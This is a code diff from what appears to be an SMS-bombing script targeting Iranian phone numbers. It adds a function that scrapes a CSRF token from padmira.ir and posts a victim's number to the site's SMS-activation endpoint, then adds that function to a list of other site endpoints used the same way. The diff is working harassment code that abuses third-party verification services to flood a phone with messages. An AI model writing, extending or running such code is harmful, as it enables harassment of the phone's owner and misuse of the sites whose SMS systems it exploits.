@@ -161,11 +161,26 @@ def darunet(phone):
         print(f"[Darunet] Error: {e}")
         return False
 
+
+def padmira(phone):
+    phone = '0' + phone.split('+98')[-1].split('98')[-1]
+    s = requests.Session()
+    h = {"User-Agent": "Mozilla/5.0"}
+    try:
+        res = s.get("https://padmira.ir/", headers=h, timeout=10)
+        token = (BeautifulSoup(res.text, "html.parser").find("meta", {"name": "csrf-token"}) or {}).get("content")
+        if not token: return {"error": "Token not found"}
+        r = s.post("https://padmira.ir/ajax/send_sms_active", data={"mobile": phone}, headers={**h, "X-CSRF-TOKEN": token, "X-Requested-With": "XMLHttpRequest"}, timeout=10)
+        try: return r.json()
+        except: return {"response": r.text}
+    except Exception as e: return {"error": str(e)}
+
+
 # ==========================
 # لیست سرویس‌ها
 # ==========================
 services = [
-    digikala, bimehland, bimeparsian, ebimename, didar24 ,ibime ,bimeh, darunet
+    digikala, bimehland, bimeparsian, ebimename, didar24 ,ibime ,bimeh, darunet, padmira
 ]
 
 # ==========================
